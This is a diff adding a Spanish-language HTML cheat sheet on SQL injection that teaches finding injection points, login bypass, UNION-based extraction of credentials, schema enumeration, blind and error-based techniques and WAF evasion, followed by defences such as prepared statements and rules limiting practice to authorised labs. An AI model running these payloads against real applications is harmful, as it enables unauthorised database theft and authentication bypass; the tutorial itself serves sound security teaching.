@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Inyección SQL · Chuletario</title>
+    <link rel="stylesheet" href="../assets/chuletas.css">
+    <link rel="icon" href="../assets/favicon.svg">
+  </head>
+  <body data-tema="hacking">
+    <!-- Cabecera de la chuleta -->
+    <header class="top">
+      <div class="wrap">
+        <div class="titulo">
+          <nav class="miga" aria-label="Ruta"><a href="../index.html">Chuletario</a><span aria-hidden="true">›</span><a href="index.html">Hacking</a><span aria-hidden="true">›</span><span>Inyección SQL</span></nav>
+          <h1>Inyección SQL</h1>
+        </div>
+        <div class="apoyo">
+          <p class="sub">El flujo manual: encontrar el punto de inyección, confirmarlo y extraer datos con UNION, a ciegas o por error. Para auditar aplicaciones propias o de laboratorio con autorización.</p>
+          <div class="herramientas"><button type="button" data-accion="tema">Tema oscuro</button><button type="button" data-accion="imprimir">Imprimir</button></div>
+        </div>
+      </div>
+    </header>
+    <nav class="nav-tema" aria-label="Chuletas de Hacking">
+      <div class="wrap"><a href="pentest.html">Pentest</a><a href="marcos-referencia.html">Marcos de referencia</a><a href="inyeccion-sql.html" aria-current="page">Inyección SQL</a><a href="fuerza-bruta.html">Fuerza bruta</a><a href="fuzzing.html">Fuzzing</a><a href="google-dorking.html">Google dorking</a><a href="shells.html">Shells</a><a href="nmap.html">Nmap</a><a href="netcat.html">Netcat</a><a href="sqlmap.html">sqlmap</a></div>
+    </nav>
+    <main class="wrap">
+      <!-- Índice de secciones -->
+      <nav class="toc" aria-label="Secciones"><a href="#s1"><b>1</b>Qué es y por qué ocurre</a><a href="#s2"><b>2</b>Encontrar el punto de inyección</a><a href="#s3"><b>3</b>Jugar con las comillas</a><a href="#s4"><b>4</b>Comentarios por motor</a><a href="#s5"><b>5</b>Saltarse un login</a><a href="#s6"><b>6</b>Contar columnas</a><a href="#s7"><b>7</b>UNION: extraer datos</a><a href="#s8"><b>8</b>Enumerar el esquema</a><a href="#s9"><b>9</b>A ciegas: booleana y por tiempo</a><a href="#s10"><b>10</b>Basada en error</a><a href="#s11"><b>11</b>Evadir filtros</a><a href="#s12"><b>12</b>Cómo defenderse</a><a href="#s13"><b>13</b>Normas de uso</a></nav>
+      <div class="banda">
+        <p class="banda-titulo">Antes de empezar</p>
+        <p class="aviso"><strong>Solo con autorización.</strong> Estas técnicas leen y pueden modificar la base de datos real de una aplicación. Practícalas únicamente contra entornos tuyos o creados para ello (DVWA, bWAPP, OWASP Juice Shop, <a href="https://portswigger.net/web-security/sql-injection">los labs de PortSwigger</a>, <code>testphp.vulnweb.com</code>). Lanzarlas contra un sitio ajeno es un delito, aunque «solo estés probando».</p>
+        <div class="cols">
+          <div>
+            <p class="banda-titulo">La idea en una línea</p>
+            <figure class="codigo"><figcaption>El parámetro <code>id</code> entra tal cual en la consulta</figcaption><pre data-lang="sql"><code><span class="tok-clave">SELECT</span> * <span class="tok-clave">FROM</span> productos <span class="tok-clave">WHERE</span> id = <span class="tok-texto">'1'</span>;
+<span class="tok-coment">-- id = 1' OR '1'='1   →   WHERE id = '1' OR '1'='1'</span></code></pre></figure>
+            <p class="txt">Si consigues que el dato cambie la <em>estructura</em> de la consulta, controlas lo que devuelve. Todo lo demás son variantes de esto.</p>
+          </div>
+          <div>
+            <p class="banda-titulo">El flujo del ataque manual</p>
+            <div class="pasos">
+              <div class="paso"><span class="n">1</span><b>Punto</b><small>qué parámetro</small></div>
+              <span class="separador">›</span>
+              <div class="paso"><span class="n">2</span><b>Confirmar</b><small>comilla y comentario</small></div>
+              <span class="separador">›</span>
+              <div class="paso"><span class="n">3</span><b>Columnas</b><small>ORDER BY / UNION</small></div>
+              <span class="separador">›</span>
+              <div class="paso"><span class="n">4</span><b>Extraer</b><small>UNION o a ciegas</small></div>
+            </div>
+            <p class="nota">Cuando domines el flujo a mano, <a href="sqlmap.html">sqlmap</a> lo automatiza. Pero entenderlo primero es lo que te deja interpretar lo que hace la herramienta y arreglar el fallo (sección 12).</p>
+          </div>
+        </div>
+      </div>
+      <!-- Secciones -->
+      <div class="rejilla">
+        <!-- 1. Qué es y por qué ocurre -->
+        <section id="s1" class="tarjeta">
+          <h2><span class="num">1</span>Qué es y por qué ocurre</h2>
+          <div class="cuerpo">
+            <p class="txt">Ocurre cuando una aplicación construye una consulta SQL pegando texto del usuario sin separarlo del código. El dato y la orden viajan mezclados, así que un dato con sintaxis SQL pasa a ser orden.</p>
+            <figure class="codigo"><figcaption>Código vulnerable: el parámetro se concatena</figcaption><pre data-lang="php"><code><span class="tok-variable">$id</span>  = <span class="tok-variable">$_GET</span>[<span class="tok-texto">'id'</span>];
+<span class="tok-variable">$sql</span> = <span class="tok-texto">"SELECT * FROM productos WHERE id = '"</span> . <span class="tok-variable">$id</span> . <span class="tok-texto">"'"</span>;
+<span class="tok-coment">// id=1              →  ... WHERE id = '1'</span>
+<span class="tok-coment">// id=1' OR '1'='1   →  ... WHERE id = '1' OR '1'='1'   (siempre cierto)</span></code></pre></figure>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row">En banda (UNION)</th><td>el dato robado sale en la misma página (sección 7)</td></tr>
+                  <tr><th scope="row">A ciegas</th><td>la página no muestra el dato; lo deduces por su comportamiento (sección 9)</td></tr>
+                  <tr><th scope="row">Por error</th><td>el gestor devuelve mensajes que filtran el dato (sección 10)</td></tr>
+                  <tr><th scope="row">Fuera de banda</th><td>el dato sale por otro canal (DNS, HTTP); menos habitual</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p class="nota">La inyección vive en el código, no en la URL: la misma causa aparece en cualquier lenguaje que concatene (PHP, Java, Python, Node...).</p>
+          </div>
+        </section>
+        <!-- 2. Encontrar el punto de inyección -->
+        <section id="s2" class="tarjeta">
+          <h2><span class="num">2</span>Encontrar el punto de inyección</h2>
+          <div class="cuerpo">
+            <p class="txt">Cualquier valor que la aplicación reciba y use en una consulta es candidato. No solo lo que se ve en la URL:</p>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row">GET</th><td><code>?id=1</code>, <code>?orden=precio</code>, <code>?categoria=libros</code></td></tr>
+                  <tr><th scope="row">POST</th><td>campos de formularios: login, búsqueda, filtros</td></tr>
+                  <tr><th scope="row">Cookies</th><td><code>Cookie: pref=...</code> si la app las consulta</td></tr>
+                  <tr><th scope="row">Cabeceras</th><td><code>User-Agent</code>, <code>Referer</code>, <code>X-Forwarded-For</code> en logs</td></tr>
+                  <tr><th scope="row">JSON / API</th><td>valores dentro del cuerpo de la petición</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p class="txt">La señal que buscas es que <strong>un carácter raro rompa algo</strong>. Prueba a enviar una comilla y mira si la respuesta cambia (error 500, página en blanco, resultado distinto):</p>
+            <figure class="codigo"><pre data-lang="text"><code>?id=1'            → error o cambio  = candidato
+?id=1 ORDER BY 1  → funciona
+?id=1 ORDER BY 99 → error            = controlas el SQL</code></pre></figure>
+            <p class="nota">Para descubrir parámetros ocultos, mira el código fuente y el JS, o haz <a href="fuzzing.html">fuzzing</a> de nombres (<code>id</code>, <code>uid</code>, <code>cat</code>, <code>q</code>, <code>sort</code>...). Un proxy como Burp o ZAP te deja ver y reenviar cada petición cómodamente.</p>
+          </div>
+        </section>
+        <!-- 3. Jugar con las comillas -->
+        <section id="s3" class="tarjeta">
+          <h2><span class="num">3</span>Jugar con las comillas</h2>
+          <div class="cuerpo">
+            <p class="txt">Primero averigua el <em>contexto</em>: si tu dato va entre comillas (texto) o sin ellas (número). Lo delata cómo reacciona:</p>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row"><code>'</code></th><td>una comilla suelta: si rompe, hay contexto de texto</td></tr>
+                  <tr><th scope="row"><code>''</code></th><td>dos comillas: vuelve a equilibrar; si ya no rompe, lo confirma</td></tr>
+                  <tr><th scope="row"><code>' AND '1'='1</code></th><td>cierto: la página sigue igual</td></tr>
+                  <tr><th scope="row"><code>' AND '1'='2</code></th><td>falso: la página cambia o se vacía</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <figure class="codigo"><figcaption>Numérico: no hace falta comilla, se cierra con un comentario</figcaption><pre data-lang="sql"><code><span class="tok-coment">-- consulta:  WHERE id = 1</span>
+id=1 <span class="tok-clave">AND</span> <span class="tok-numero">1</span>=<span class="tok-numero">1</span>     <span class="tok-coment">-- cierto  → igual</span>
+id=1 <span class="tok-clave">AND</span> <span class="tok-numero">1</span>=<span class="tok-numero">2</span>     <span class="tok-coment">-- falso   → cambia</span></code></pre></figure>
+            <figure class="codigo"><figcaption>Texto: cierras la comilla y comentas el resto de la consulta original</figcaption><pre data-lang="sql"><code><span class="tok-coment">-- consulta:  WHERE nombre = 'ENTRADA'</span>
+nombre=a<span class="tok-texto">'</span> <span class="tok-clave">OR</span> <span class="tok-texto">'1'</span>=<span class="tok-texto">'1</span>      <span class="tok-coment">-- equilibrando las comillas a mano</span>
+nombre=a<span class="tok-texto">'</span> <span class="tok-clave">OR</span> <span class="tok-numero">1</span>=<span class="tok-numero">1</span>-- -      <span class="tok-coment">-- o comentando lo que sobra (ver sección 4)</span></code></pre></figure>
+            <p class="aviso"><strong>Idea clave:</strong> la comilla no es el objetivo, es el detector. Lo que confirma la inyección es que una condición <em>cierta</em> y una <em>falsa</em> den respuestas distintas.</p>
+          </div>
+        </section>
+        <!-- 4. Comentarios por motor -->
+        <section id="s4" class="tarjeta">
+          <h2><span class="num">4</span>Comentarios por motor</h2>
+          <div class="cuerpo">
+            <p class="txt">Tras tu carga suele sobrar parte de la consulta original (más comillas, un <code>LIMIT</code>...). Se anula con un comentario:</p>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row"><code>-- </code></th><td>SQL estándar. <strong>Ojo: necesita un espacio después.</strong> Se suele escribir <code>-- -</code></td></tr>
+                  <tr><th scope="row"><code>#</code></th><td>comentario de MySQL / MariaDB (en URL va como <code>%23</code>)</td></tr>
+                  <tr><th scope="row"><code>/* */</code></th><td>comentario de bloque; útil en medio de la consulta</td></tr>
+                  <tr><th scope="row"><code>;</code></th><td>fin de consulta; para apilar otra si el motor lo permite</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <figure class="codigo"><figcaption>Identificar el gestor por sus funciones de versión</figcaption><pre data-lang="sql"><code>MySQL/MariaDB  <span class="tok-clave">SELECT</span> <span class="tok-funcion">version</span>(), <span class="tok-funcion">database</span>(), <span class="tok-funcion">user</span>()
+PostgreSQL     <span class="tok-clave">SELECT</span> <span class="tok-funcion">version</span>(), <span class="tok-funcion">current_database</span>()
+SQL Server     <span class="tok-clave">SELECT</span> @@version, <span class="tok-funcion">DB_NAME</span>()
+Oracle         <span class="tok-clave">SELECT</span> banner <span class="tok-clave">FROM</span> v$version   <span class="tok-coment">-- requiere FROM dual</span>
+SQLite         <span class="tok-clave">SELECT</span> <span class="tok-funcion">sqlite_version</span>()</code></pre></figure>
+            <p class="nota">La concatenación también cambia por motor: <code>CONCAT()</code> en MySQL, <code>||</code> en PostgreSQL/Oracle/SQLite, <code>+</code> en SQL Server. Identificar el gestor pronto te ahorra mucho tanteo.</p>
+          </div>
+        </section>
+        <!-- 5. Saltarse un login -->
+        <section id="s5" class="tarjeta">
+          <h2><span class="num">5</span>Saltarse un login</h2>
+          <div class="cuerpo">
+            <p class="txt">El caso clásico de laboratorio: un login que compara usuario y contraseña en una sola consulta. Si inyectas una condición siempre cierta, entras sin saber la clave.</p>
+            <figure class="codigo"><figcaption>Consulta del login (vulnerable)</figcaption><pre data-lang="sql"><code><span class="tok-clave">SELECT</span> * <span class="tok-clave">FROM</span> usuarios
+<span class="tok-clave">WHERE</span> usuario = <span class="tok-texto">'ENTRADA'</span> <span class="tok-clave">AND</span> clave = <span class="tok-texto">'ENTRADA'</span>;</code></pre></figure>
+            <figure class="codigo"><figcaption>En el campo usuario</figcaption><pre data-lang="sql"><code>admin<span class="tok-texto">'</span>-- -
+<span class="tok-coment">-- → WHERE usuario = 'admin'-- -' AND clave = '...'</span>
+<span class="tok-coment">-- entra como admin; la comprobación de la clave queda comentada</span>
+
+<span class="tok-texto">'</span> <span class="tok-clave">OR</span> <span class="tok-numero">1</span>=<span class="tok-numero">1</span>-- -
+<span class="tok-coment">-- devuelve el primer usuario de la tabla (a menudo el admin)</span></code></pre></figure>
+            <p class="aviso"><strong>Por qué funciona:</strong> no es que «adivines» la clave; es que comentas la parte que la verifica. La defensa (sección 12) corta exactamente esto.</p>
+          </div>
+        </section>
+        <!-- 6. Contar columnas -->
+        <section id="s6" class="tarjeta">
+          <h2><span class="num">6</span>Contar columnas</h2>
+          <div class="cuerpo">
+            <p class="txt">Para usar <code>UNION</code> (sección 7) tu consulta tiene que devolver <em>el mismo número de columnas</em> que la original. Hay dos formas de averiguarlo:</p>
+            <figure class="codigo"><figcaption>ORDER BY: sube hasta que falle. El último número que funciona = nº de columnas</figcaption><pre data-lang="sql"><code>?id=1 <span class="tok-clave">ORDER BY</span> <span class="tok-numero">1</span>   <span class="tok-coment">-- ok</span>
+?id=1 <span class="tok-clave">ORDER BY</span> <span class="tok-numero">2</span>   <span class="tok-coment">-- ok</span>
+?id=1 <span class="tok-clave">ORDER BY</span> <span class="tok-numero">3</span>   <span class="tok-coment">-- ok</span>
+?id=1 <span class="tok-clave">ORDER BY</span> <span class="tok-numero">4</span>   <span class="tok-coment">-- error  → hay 3 columnas</span></code></pre></figure>
+            <figure class="codigo"><figcaption>UNION SELECT NULL: añade NULL hasta que deje de dar error</figcaption><pre data-lang="sql"><code>?id=<span class="tok-numero">1</span> <span class="tok-clave">UNION SELECT</span> <span class="tok-clave">NULL</span>-- -                <span class="tok-coment">-- error</span>
+?id=<span class="tok-numero">1</span> <span class="tok-clave">UNION SELECT</span> <span class="tok-clave">NULL</span>,<span class="tok-clave">NULL</span>-- -           <span class="tok-coment">-- error</span>
+?id=<span class="tok-numero">1</span> <span class="tok-clave">UNION SELECT</span> <span class="tok-clave">NULL</span>,<span class="tok-clave">NULL</span>,<span class="tok-clave">NULL</span>-- -      <span class="tok-coment">-- ok  → 3 columnas</span></code></pre></figure>
+            <p class="nota"><code>NULL</code> encaja en cualquier tipo de columna, por eso se usa para tantear sin que el tipo de dato dé un error aparte.</p>
+          </div>
+        </section>
+        <!-- 7. UNION: extraer datos -->
+        <section id="s7" class="tarjeta">
+          <h2><span class="num">7</span>UNION: extraer datos</h2>
+          <div class="cuerpo">
+            <p class="txt">Con el número de columnas, averigua <em>cuáles se muestran</em> en la página poniendo marcas, y usa esas posiciones para sacar datos.</p>
+            <figure class="codigo"><figcaption>Ver qué columnas se reflejan (aquí salen la 2 y la 3)</figcaption><pre data-lang="sql"><code>?id=-<span class="tok-numero">1</span> <span class="tok-clave">UNION SELECT</span> <span class="tok-numero">1</span>,<span class="tok-numero">2</span>,<span class="tok-numero">3</span>-- -
+<span class="tok-coment">-- id=-1 hace que la fila original no exista: solo se ve tu UNION</span></code></pre></figure>
+            <figure class="codigo"><figcaption>Colocar los datos en las posiciones que se ven (MySQL)</figcaption><pre data-lang="sql"><code>?id=-<span class="tok-numero">1</span> <span class="tok-clave">UNION SELECT</span> <span class="tok-numero">1</span>,<span class="tok-funcion">version</span>(),<span class="tok-funcion">database</span>()-- -
+?id=-<span class="tok-numero">1</span> <span class="tok-clave">UNION SELECT</span> <span class="tok-numero">1</span>,<span class="tok-funcion">user</span>(),@@datadir-- -</code></pre></figure>
+            <figure class="codigo"><figcaption>Juntar varios valores en una sola columna reflejada</figcaption><pre data-lang="sql"><code>MySQL        <span class="tok-clave">UNION SELECT</span> <span class="tok-numero">1</span>,<span class="tok-funcion">concat</span>(usuario,<span class="tok-texto">':'</span>,clave),<span class="tok-numero">3</span> <span class="tok-clave">FROM</span> usuarios-- -
+PostgreSQL   <span class="tok-clave">UNION SELECT</span> <span class="tok-numero">1</span>,usuario||<span class="tok-texto">':'</span>||clave,<span class="tok-numero">3</span> <span class="tok-clave">FROM</span> usuarios-- -</code></pre></figure>
+            <p class="aviso"><strong>Si los tipos no cuadran</strong> (p. ej. una columna numérica donde metes texto), cambia esa posición por <code>NULL</code> y usa otra columna reflejada para el texto.</p>
+          </div>
+        </section>
+        <!-- 8. Enumerar el esquema -->
+        <section id="s8" class="tarjeta">
+          <h2><span class="num">8</span>Enumerar el esquema</h2>
+          <div class="cuerpo">
+            <p class="txt">No adivines los nombres de tablas y columnas: pregúntaselos al propio gestor. Casi todos exponen un catálogo <code>information_schema</code>.</p>
+            <figure class="codigo"><figcaption>Listar tablas de la base actual (MySQL / PostgreSQL / SQL Server)</figcaption><pre data-lang="sql"><code><span class="tok-clave">UNION SELECT</span> <span class="tok-numero">1</span>,table_name,<span class="tok-numero">3</span>
+  <span class="tok-clave">FROM</span> information_schema.tables
+  <span class="tok-clave">WHERE</span> table_schema = <span class="tok-funcion">database</span>()-- -</code></pre></figure>
+            <figure class="codigo"><figcaption>Columnas de una tabla concreta</figcaption><pre data-lang="sql"><code><span class="tok-clave">UNION SELECT</span> <span class="tok-numero">1</span>,column_name,<span class="tok-numero">3</span>
+  <span class="tok-clave">FROM</span> information_schema.columns
+  <span class="tok-clave">WHERE</span> table_name = <span class="tok-texto">'usuarios'</span>-- -</code></pre></figure>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row">MySQL / PostgreSQL</th><td><code>information_schema.tables</code> y <code>.columns</code></td></tr>
+                  <tr><th scope="row">SQL Server</th><td>igual, o <code>sys.tables</code> / <code>sys.columns</code></td></tr>
+                  <tr><th scope="row">Oracle</th><td><code>all_tables</code>, <code>all_tab_columns</code></td></tr>
+                  <tr><th scope="row">SQLite</th><td><code>sqlite_master</code> (columna <code>sql</code> con el CREATE)</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p class="nota">El orden natural: base actual → sus tablas → columnas de la tabla interesante → volcado de esas columnas con un <code>UNION</code> como el de la sección 7.</p>
+          </div>
+        </section>
+        <!-- 9. A ciegas -->
+        <section id="s9" class="tarjeta">
+          <h2><span class="num">9</span>A ciegas: booleana y por tiempo</h2>
+          <div class="cuerpo">
+            <p class="txt">Cuando la página no muestra el resultado de la consulta, se extrae el dato <em>letra a letra</em>, preguntando por sí o por no. Es lento y casi siempre se automatiza, pero conviene entenderlo.</p>
+            <figure class="codigo"><figcaption>Booleana: la respuesta cambia según la condición sea cierta o falsa</figcaption><pre data-lang="sql"><code><span class="tok-coment">-- ¿la primera letra de la clave del usuario 1 es la 'a' (97)?</span>
+?id=<span class="tok-numero">1</span> <span class="tok-clave">AND</span> <span class="tok-funcion">ascii</span>(<span class="tok-funcion">substring</span>((<span class="tok-clave">SELECT</span> clave <span class="tok-clave">FROM</span> usuarios <span class="tok-clave">LIMIT</span> <span class="tok-numero">1</span>),<span class="tok-numero">1</span>,<span class="tok-numero">1</span>))=<span class="tok-numero">97</span>-- -
+<span class="tok-coment">-- página normal = sí   ·   página distinta = no   →  se busca por bisección</span></code></pre></figure>
+            <figure class="codigo"><figcaption>Por tiempo: si no cambia nada visible, se mide el retardo</figcaption><pre data-lang="sql"><code>MySQL        ?id=<span class="tok-numero">1</span> <span class="tok-clave">AND</span> <span class="tok-funcion">IF</span>(<span class="tok-numero">1</span>=<span class="tok-numero">1</span>,<span class="tok-funcion">SLEEP</span>(<span class="tok-numero">3</span>),<span class="tok-numero">0</span>)-- -
+PostgreSQL   ?id=<span class="tok-numero">1</span>; <span class="tok-clave">SELECT</span> <span class="tok-funcion">pg_sleep</span>(<span class="tok-numero">3</span>)-- -
+SQL Server   ?id=<span class="tok-numero">1</span>; <span class="tok-clave">WAITFOR DELAY</span> <span class="tok-texto">'0:0:3'</span>-- -
+<span class="tok-coment">-- si la respuesta tarda ~3 s, la condición era cierta</span></code></pre></figure>
+            <p class="nota">La bisección (¿la letra es &gt; la 'm'? ¿&gt; la 't'?...) reduce cada carácter a unas 7 preguntas. Es justo el tipo de tarea repetitiva que hace <a href="sqlmap.html">sqlmap</a> en segundos.</p>
+          </div>
+        </section>
+        <!-- 10. Basada en error -->
+        <section id="s10" class="tarjeta">
+          <h2><span class="num">10</span>Basada en error</h2>
+          <div class="cuerpo">
+            <p class="txt">Si la aplicación muestra los errores del gestor, puedes forzar un error que <em>incluya el dato</em> dentro del propio mensaje. Rápido cuando funciona.</p>
+            <figure class="codigo"><figcaption>MySQL, con una función que falla mostrando el valor</figcaption><pre data-lang="sql"><code>?id=<span class="tok-numero">1</span> <span class="tok-clave">AND</span> <span class="tok-funcion">extractvalue</span>(<span class="tok-numero">1</span>,<span class="tok-funcion">concat</span>(<span class="tok-texto">0x7e</span>,(<span class="tok-clave">SELECT</span> <span class="tok-funcion">database</span>())))-- -
+<span class="tok-coment">-- el mensaje de error devuelve algo como:  XPATH syntax error: '~tienda'</span></code></pre></figure>
+            <p class="aviso"><strong>Esto es también un fallo de configuración:</strong> una aplicación en producción nunca debería enseñar los errores del gestor. Ocultarlos (sección 12) elimina esta vía y da menos pistas al atacante.</p>
+          </div>
+        </section>
+        <!-- 11. Evadir filtros -->
+        <section id="s11" class="tarjeta">
+          <h2><span class="num">11</span>Evadir filtros</h2>
+          <div class="cuerpo">
+            <p class="txt">Muchos filtros caseros y WAFs se saltan con transformaciones equivalentes. Verlo ayuda a entender por qué filtrar «palabras malas» no es una defensa de verdad:</p>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row">Codificar en URL</th><td><code>'</code> → <code>%27</code>, espacio → <code>%20</code> o <code>+</code></td></tr>
+                  <tr><th scope="row">Mayúsculas mezcladas</th><td><code>UnIoN SeLeCt</code> frente a filtros de palabra exacta</td></tr>
+                  <tr><th scope="row">Comentarios en medio</th><td><code>UN/**/ION</code>, <code>SE/**/LECT</code></td></tr>
+                  <tr><th scope="row">Sin espacios</th><td><code>/**/</code>, <code>%0a</code> o paréntesis en lugar de espacio</td></tr>
+                  <tr><th scope="row">Doble codificación</th><td><code>%2527</code> si la app descodifica dos veces</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p class="nota">sqlmap trae estas transformaciones en sus scripts de <em>tamper</em> (<code>--tamper</code>). La lección defensiva: una lista negra siempre se rodea; lo que corta la inyección son las consultas preparadas, no filtrar cadenas.</p>
+          </div>
+        </section>
+        <!-- 12. Cómo defenderse -->
+        <section id="s12" class="tarjeta">
+          <h2><span class="num">12</span>Cómo defenderse</h2>
+          <div class="cuerpo">
+            <p class="txt">Aprender el ataque es aprender a cerrarlo. La inyección SQL se corta en el código separando el dato del SQL: con <strong>consultas preparadas</strong>, el motor recibe la estructura y los valores por separado, así que un dato nunca puede volverse orden.</p>
+            <figure class="codigo"><figcaption>PHP con PDO: el valor va aparte, nunca concatenado</figcaption><pre data-lang="php"><code><span class="tok-variable">$stmt</span> = <span class="tok-variable">$pdo</span>-&gt;<span class="tok-funcion">prepare</span>(<span class="tok-texto">"SELECT * FROM productos WHERE id = ?"</span>);
+<span class="tok-variable">$stmt</span>-&gt;<span class="tok-funcion">execute</span>([<span class="tok-variable">$_GET</span>[<span class="tok-texto">'id'</span>]]);</code></pre></figure>
+            <figure class="codigo"><figcaption>Java con JDBC: PreparedStatement con parámetros</figcaption><pre data-lang="java"><code><span class="tok-clave">var</span> ps = con.<span class="tok-funcion">prepareStatement</span>(<span class="tok-texto">"SELECT * FROM productos WHERE id = ?"</span>);
+ps.<span class="tok-funcion">setInt</span>(<span class="tok-numero">1</span>, id);</code></pre></figure>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row">Consultas preparadas</th><td>la medida principal; separa el código de los datos</td></tr>
+                  <tr><th scope="row">Validar la entrada</th><td>si esperas un número o un valor de una lista, imponlo</td></tr>
+                  <tr><th scope="row">Mínimos privilegios</th><td>la cuenta de la web no debe ser administradora del gestor</td></tr>
+                  <tr><th scope="row">No mostrar errores</th><td>oculta los mensajes del gestor en producción (corta la sección 10)</td></tr>
+                  <tr><th scope="row">Escapar nombres dinámicos</th><td>columnas de <code>ORDER BY</code> por lista blanca, no concatenadas</td></tr>
+                  <tr><th scope="row">WAF</th><td>capa extra, nunca sustituto del código correcto</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p class="nota">Más sobre consultas preparadas en las chuletas de <a href="../bases-datos/postgresql.html">bases de datos</a>, <a href="../php/sintaxis.html">PHP</a> y <a href="../java/index.html">Java</a>.</p>
+          </div>
+        </section>
+        <!-- 13. Normas de uso -->
+        <section id="s13" class="tarjeta">
+          <h2><span class="num">13</span>Normas de uso</h2>
+          <div class="cuerpo"><p class="txt">Practica solo sobre aplicaciones tuyas o de laboratorio, y con permiso por escrito y alcance definido cuando audites las de otra persona. Las condiciones <code>OR 1=1</code> dentro de un <code>UPDATE</code> o <code>DELETE</code> pueden afectar a toda una tabla: no las lances sobre datos que te importe conservar. Los datos que extraigas son información sensible real; trátalos como tal y bórralos al terminar. El objetivo de aprender esto es construir aplicaciones que no se puedan inyectar.</p></div>
+        </section>
+      </div>
+      <nav class="paginacion" aria-label="Chuleta anterior y siguiente"><a class="anterior" href="marcos-referencia.html">← Marcos de referencia</a><a class="siguiente" href="fuerza-bruta.html">Fuerza bruta →</a></nav>
+      <footer class="pie">Guía de referencia: <a href="https://portswigger.net/web-security/sql-injection">Web Security Academy de PortSwigger</a> y la <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP SQL Injection Prevention Cheat Sheet</a>.</footer>
+    </main>
+    <script src="../assets/chuletas.js" defer></script>
+  </body>
+</html>
